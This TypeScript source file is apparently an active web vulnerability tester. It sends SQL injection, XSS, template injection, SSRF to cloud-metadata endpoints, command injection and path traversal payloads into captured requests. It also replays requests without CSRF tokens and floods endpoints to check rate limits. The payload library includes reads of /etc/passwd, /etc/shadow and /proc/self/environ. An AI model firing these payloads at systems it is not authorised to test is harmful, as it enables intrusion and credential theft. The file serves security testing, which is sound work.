/**
 * Active Tester — injection, CSRF, rate limit testing.
 *
 * Sends actual requests to verify vulnerabilities.
 * Uses Bun's fetch (server-side, not browser) to avoid polluting browser state.
 *
 * Injection types: sqli, xss, ssrf, ssti, cmdi, lfi, html_injection
 */

import type { CapturedRequest, InjectionPoint, Header } from "../types/index.js";

const DEFAULT_TIMEOUT = 30_000;

function fetchWithTimeout(url: string, init: RequestInit, timeoutMs = DEFAULT_TIMEOUT): Promise<Response> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  return fetch(url, { ...init, signal: controller.signal }).finally(() => clearTimeout(timer));
}

export interface TestResult {
  type: string;
  vulnerable: boolean;
  confidence: "high" | "medium" | "low";
  endpoint: string;
  method: string;
  evidence: string;
  payload?: string;
  technique?: string;
  response?: { status: number; bodySnippet: string; headers: Record<string, string> };
}

// ─── Injection Payloads ───

const PAYLOADS: Record<string, { payload: string; detect: RegExp; technique: string }[]> = {
  sqli: [
    // Error-based
    { payload: "' OR '1'='1", detect: /sql|syntax|query|ORA-|mysql|postgres|sqlite|SQLSTATE/i, technique: "error-based" },
    { payload: "1 UNION SELECT NULL--", detect: /sql|syntax|union|column/i, technique: "union-based" },
    { payload: "1' AND 1=CONVERT(int,@@version)--", detect: /sql|convert|version/i, technique: "mssql-error" },
    { payload: "' AND extractvalue(1,concat(0x7e,version()))--", detect: /xpath|extractvalue|sql/i, technique: "xml-error" },
    // Time-based blind
    { payload: "'; WAITFOR DELAY '0:0:3'--", detect: /./s, technique: "time-based-mssql" },
    { payload: "' AND SLEEP(3)--", detect: /./s, technique: "time-based-mysql" },
    { payload: "'; SELECT pg_sleep(3)--", detect: /./s, technique: "time-based-postgres" },
    // Boolean-based blind
    { payload: "' AND '1'='1", detect: /./s, technique: "boolean-true" },
    { payload: "' AND '1'='2", detect: /./s, technique: "boolean-false" },
  ],
  xss: [
    // Reflected XSS
    { payload: '<script>alert("hb")</script>', detect: /<script>alert/, technique: "reflected-script" },
    { payload: '"><img src=x onerror=alert(1)>', detect: /onerror=alert/, technique: "reflected-event" },
    { payload: "javascript:alert(1)", detect: /javascript:alert/, technique: "protocol-handler" },
    { payload: '<svg onload=alert(1)>', detect: /svg onload/, technique: "svg-event" },
    { payload: "'-alert(1)-'", detect: /'-alert\(1\)-'/, technique: "js-context-break" },
    // DOM-based / HTML5
    { payload: '<details open ontoggle=alert(1)>', detect: /ontoggle=alert/, technique: "html5-event" },
    { payload: '<iframe src="javascript:alert(1)">', detect: /iframe.*javascript/, technique: "iframe-injection" },
    { payload: '{{constructor.constructor("return this")()}}', detect: /constructor/, technique: "prototype-pollution" },
  ],
  ssti: [
    // Jinja2 / Twig
    { payload: "{{7*7}}", detect: /49/, technique: "jinja2-basic" },
    { payload: "{{config.__class__.__init__.__globals__}}", detect: /os|subprocess|builtins/i, technique: "jinja2-rce" },
    { payload: "${7*7}", detect: /49/, technique: "freemarker" },
    { payload: "<%= 7*7 %>", detect: /49/, technique: "erb" },
    { payload: "#{7*7}", detect: /49/, technique: "ruby-slim" },
    { payload: "{{constructor.constructor('return 7*7')()}}", detect: /49/, technique: "angular-sandbox" },
    { payload: "${T(java.lang.Runtime).getRuntime()}", detect: /runtime|java/i, technique: "spring-el" },
    { payload: "{{range.constructor('return 7*7')()}}", detect: /49/, technique: "vue-ssti" },
  ],
  ssrf: [
    // Localhost variants
    { payload: "http://127.0.0.1:80", detect: /localhost|127\.0\.0\.1|<!DOCTYPE|<html/i, technique: "localhost-http" },
    { payload: "http://[::1]:80", detect: /<html|<!DOCTYPE/i, technique: "ipv6-localhost" },
    { payload: "http://0x7f000001", detect: /<html|<!DOCTYPE/i, technique: "hex-ip" },
    { payload: "http://0177.0.0.1", detect: /<html|<!DOCTYPE/i, technique: "octal-ip" },
    // Cloud metadata
    { payload: "http://169.254.169.254/latest/meta-data/", detect: /ami-id|instance-id|iam/i, technique: "aws-metadata" },
    { payload: "http://metadata.google.internal/computeMetadata/v1/", detect: /project|instance/i, technique: "gcp-metadata" },
    { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", detect: /compute|subscription/i, technique: "azure-metadata" },
    // DNS rebinding
    { payload: "http://localtest.me", detect: /<html|<!DOCTYPE/i, technique: "dns-rebind" },
  ],
  cmdi: [
    { payload: "; echo hbtest", detect: /hbtest/, technique: "semicolon" },
    { payload: "| echo hbtest", detect: /hbtest/, technique: "pipe" },
    { payload: "`echo hbtest`", detect: /hbtest/, technique: "backtick" },
    { payload: "$(echo hbtest)", detect: /hbtest/, technique: "subshell" },
    { payload: "& echo hbtest", detect: /hbtest/, technique: "background" },
    { payload: "\necho hbtest", detect: /hbtest/, technique: "newline" },
    { payload: "'; echo hbtest #", detect: /hbtest/, technique: "quote-break" },
    { payload: "%0aecho hbtest", detect: /hbtest/, technique: "url-newline" },
  ],
  lfi: [
    { payload: "../../../etc/passwd", detect: /root:.*:0:0/, technique: "dot-dot-slash" },
    { payload: "....//....//....//etc/passwd", detect: /root:.*:0:0/, technique: "double-dot" },
    { payload: "/etc/passwd", detect: /root:.*:0:0/, technique: "absolute-path" },
    { payload: "..\\..\\..\\windows\\win.ini", detect: /\[fonts\]|\[extensions\]/i, technique: "windows-backslash" },
    { payload: "/proc/self/environ", detect: /PATH=|HOME=|USER=/i, technique: "proc-environ" },
    { payload: "php://filter/convert.base64-encode/resource=index.php", detect: /PD9waHA|base64/i, technique: "php-filter" },
    { payload: "%252e%252e%252fetc/passwd", detect: /root:.*:0:0/, technique: "double-encode" },
    { payload: "....//....//....//etc/shadow", detect: /root:|nobody:/i, technique: "shadow-file" },
  ],
  html_injection: [
    { payload: '<h1>INJECTED</h1>', detect: /<h1>INJECTED<\/h1>/i, technique: "basic-tag" },
    { payload: '<a href="https://evil.test">Click</a>', detect: /href="https:\/\/evil\.test"/, technique: "anchor-injection" },
    { payload: '<form action="https://evil.test"><input type="submit"></form>', detect: /action="https:\/\/evil\.test"/, technique: "form-injection" },
    { payload: '<marquee>INJECTED</marquee>', detect: /<marquee>INJECTED/, technique: "legacy-tag" },
    { payload: '<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:red">', detect: /position:absolute.*background:red/, technique: "style-overlay" },
    { payload: '<meta http-equiv="refresh" content="0;url=https://evil.test">', detect: /http-equiv="refresh"/, technique: "meta-redirect" },
  ],
};

// ─── Helper: rebuild request as fetch options ───

function buildFetchOptions(req: CapturedRequest): { url: string; init: RequestInit } {
  const headers: Record<string, string> = {};
  for (const h of req.requestHeaders) {
    // Skip hop-by-hop and host headers
    if (/^(host|connection|content-length|transfer-encoding|accept-encoding)$/i.test(h.name)) continue;
    headers[h.name] = h.value;
  }

  const init: RequestInit = {
    method: req.method,
    headers,
    redirect: "follow",
  };

  if (req.requestBody && !["GET", "HEAD"].includes(req.method)) {
    init.body = req.requestBody;
  }

  return { url: req.url, init };
}

/** Inject payload into the appropriate location of a request. */
function injectPayload(
  req: CapturedRequest,
  point: InjectionPoint,
  payload: string,
): { url: string; init: RequestInit } {
  const { url, init } = buildFetchOptions(req);
  const headers = { ...(init.headers as Record<string, string>) };

  switch (point.location) {
    case "query": {
      const u = new URL(url);
      u.searchParams.set(point.param, payload);
      return { url: u.href, init: { ...init, headers } };
    }
    case "body": {
      let body = req.requestBody || "";
      // Try JSON
      try {
        const parsed = JSON.parse(body);
        if (typeof parsed === "object" && parsed !== null) {
          parsed[point.param] = payload;
          body = JSON.stringify(parsed);
        }
      } catch {
        // Try URL-encoded
        const params = new URLSearchParams(body);
        params.set(point.param, payload);
        body = params.toString();
      }
      return { url, init: { ...init, headers, body } };
    }
    case "header": {
      headers[point.param] = payload;
      return { url, init: { ...init, headers } };
    }
    case "path": {
      const modified = url.replace(
        new RegExp(`/${encodeURIComponent(point.param)}(/|$)`),
        `/${encodeURIComponent(payload)}$1`
      );
      return { url: modified, init: { ...init, headers } };
    }
    default:
      return { url, init: { ...init, headers } };
  }
}

// ─── Test Functions ───

/** Test an injection point with type-specific payloads. */
export async function testInjection(
  point: InjectionPoint,
  originalRequest: CapturedRequest,
  types?: string[],
  maxPayloads?: number,
): Promise<TestResult[]> {
  const results: TestResult[] = [];
  const typesToTest = types || point.types;
  const limit = maxPayloads || 3;

  // Get baseline response
  let baselineStatus = originalRequest.status;
  let baselineBody = originalRequest.responseBody || "";

  // For boolean-blind SQLi, collect true/false responses
  let boolTrueBody = "";
  let boolFalseBody = "";

  for (const type of typesToTest) {
    const payloads = PAYLOADS[type];
    if (!payloads) continue;

    for (const { payload, detect, technique } of payloads.slice(0, limit)) {
      try {
        const { url, init } = injectPayload(originalRequest, point, payload);
        const startTime = Date.now();
        const response = await fetchWithTimeout(url, init);
        const elapsed = Date.now() - startTime;
        const body = await response.text();

        let vulnerable = false;
        let evidence = "";
        let confidence: "high" | "medium" | "low" = "low";

        // ── Time-based detection (SQLi SLEEP/WAITFOR) ──
        if (type === "sqli" && technique.startsWith("time-based") && elapsed > 3000) {
          vulnerable = true;
          evidence = `Time-based ${technique}: response took ${elapsed}ms (>3s delay)`;
          confidence = "high";
        }

        // ── Boolean-based blind SQLi ──
        if (type === "sqli" && technique === "boolean-true") {
          boolTrueBody = body;
        }
        if (type === "sqli" && technique === "boolean-false") {
          boolFalseBody = body;
          if (boolTrueBody && boolFalseBody) {
            const lenDiff = Math.abs(boolTrueBody.length - boolFalseBody.length);
            const avgLen = (boolTrueBody.length + boolFalseBody.length) / 2;
            if (avgLen > 0 && lenDiff / avgLen > 0.2) {
              vulnerable = true;
              evidence = `Boolean-blind: true(${boolTrueBody.length}b) vs false(${boolFalseBody.length}b) — ${Math.round(lenDiff / avgLen * 100)}% difference`;
              confidence = "medium";
            }
          }
        }

        // ── Error-based detection (pattern in response but not in baseline) ──
        if (!vulnerable && !technique.startsWith("time-based") && !technique.startsWith("boolean")) {
          if (detect.test(body) && !detect.test(baselineBody)) {
            vulnerable = true;
            evidence = `${technique}: payload triggered detectable pattern in response`;
            confidence = "high";
          }
        }

        // ── Reflected XSS / HTML injection — payload appears unencoded ──
        if (!vulnerable && (type === "xss" || type === "html_injection") && body.includes(payload)) {
          vulnerable = true;
          evidence = `${technique}: payload reflected unencoded in response body`;
          confidence = "high";
        }

        // ── SSTI — math evaluation detected ──
        if (!vulnerable && type === "ssti" && detect.test(body) && !detect.test(baselineBody)) {
          vulnerable = true;
          evidence = `${technique}: template expression evaluated in response`;
          confidence = "high";
        }

        // ── Status change detection (500 triggered by payload) ──
        if (!vulnerable && response.status >= 500 && baselineStatus < 500) {
          vulnerable = true;
          evidence = `${technique}: server error (${response.status}) triggered by payload`;
          confidence = "medium";
        }

        results.push({
          type,
          vulnerable,
          confidence,
          endpoint: point.url,
          method: originalRequest.method,
          evidence: evidence || `${technique}: no vulnerability indicators detected`,
          payload,
          technique,
          response: {
            status: response.status,
            bodySnippet: body.slice(0, 500),
            headers: Object.fromEntries(response.headers.entries()),
          },
        });

        if (vulnerable) break; // Found vuln for this type, no need to test more payloads
      } catch (err) {
        results.push({
          type,
          vulnerable: false,
          confidence: "low",
          endpoint: point.url,
          method: originalRequest.method,
          evidence: `${technique}: test failed: ${(err as Error).message}`,
          payload,
          technique,
        });
      }
    }
  }

  return results;
}

/** Test CSRF protection by replaying without token. */
export async function testCsrf(request: CapturedRequest): Promise<TestResult> {
  if (["GET", "HEAD", "OPTIONS"].includes(request.method)) {
    return {
      type: "csrf",
      vulnerable: false,
      confidence: "high",
      endpoint: request.url,
      method: request.method,
      evidence: "Safe HTTP method — CSRF not applicable",
    };
  }

  const { url, init } = buildFetchOptions(request);
  const headers = { ...(init.headers as Record<string, string>) };

  // Remove CSRF headers
  const csrfHeaderPatterns = /^(x-csrf|x-xsrf|x-token|csrf)/i;
  for (const key of Object.keys(headers)) {
    if (csrfHeaderPatterns.test(key)) delete headers[key];
  }

  // Remove CSRF from body
  let body = init.body as string || "";
  if (body) {
    try {
      const parsed = JSON.parse(body);
      for (const key of Object.keys(parsed)) {
        if (/csrf|_token|authenticity_token|__RequestVerificationToken/i.test(key)) {
          delete parsed[key];
        }
      }
      body = JSON.stringify(parsed);
    } catch {
      const params = new URLSearchParams(body);
      for (const key of [...params.keys()]) {
        if (/csrf|_token|authenticity_token|__RequestVerificationToken/i.test(key)) {
          params.delete(key);
        }
      }
      body = params.toString();
    }
  }

  try {
    const response = await fetchWithTimeout(url, { ...init, headers, body: body || undefined });
    const resBody = await response.text();
    const vulnerable = response.status >= 200 && response.status < 400;

    return {
      type: "csrf",
      vulnerable,
      confidence: vulnerable ? "medium" : "high",
      endpoint: url,
      method: request.method,
      evidence: vulnerable
        ? `Request succeeded (${response.status}) without CSRF token`
        : `Request failed (${response.status}) — CSRF protection appears active`,
      response: {
        status: response.status,
        bodySnippet: resBody.slice(0, 300),
        headers: Object.fromEntries(response.headers.entries()),
      },
    };
  } catch (err) {
    return {
      type: "csrf",
      vulnerable: false,
      confidence: "low",
      endpoint: url,
      method: request.method,
      evidence: `CSRF test failed: ${(err as Error).message}`,
    };
  }
}

/** Test rate limiting by sending rapid requests. */
export async function testRateLimit(
  request: CapturedRequest,
  count: number = 20,
  delayMs: number = 0,
): Promise<TestResult> {
  const { url, init } = buildFetchOptions(request);
  const statuses: number[] = [];
  const times: number[] = [];

  for (let i = 0; i < count; i++) {
    try {
      const start = Date.now();
      const res = await fetchWithTimeout(url, init, 15_000);
      times.push(Date.now() - start);
      statuses.push(res.status);
      // Consume body to free resources
      await res.text();
    } catch {
      statuses.push(0);
    }
    if (delayMs > 0) await new Promise((r) => setTimeout(r, delayMs));
  }

  const has429 = statuses.includes(429);
  const hasBlock = statuses.some((s) => s === 403 || s === 503);
  const allSuccess = statuses.every((s) => s >= 200 && s < 400);
  const avgTime = times.reduce((a, b) => a + b, 0) / times.length;

  const vulnerable = allSuccess && !has429 && !hasBlock;

  return {
    type: "rate_limit",
    vulnerable,
    confidence: vulnerable ? "medium" : "high",
    endpoint: url,
    method: request.method,
    evidence: vulnerable
      ? `All ${count} requests succeeded (no 429/blocking). Avg response: ${Math.round(avgTime)}ms`
      : has429
        ? `Rate limiting active: ${statuses.filter((s) => s === 429).length}/${count} requests got 429`
        : `Blocking detected: statuses = [${[...new Set(statuses)].join(", ")}]`,
    response: {
      status: statuses[statuses.length - 1],
      bodySnippet: `Statuses: ${statuses.join(", ")}`,
      headers: {},
    },
  };
}
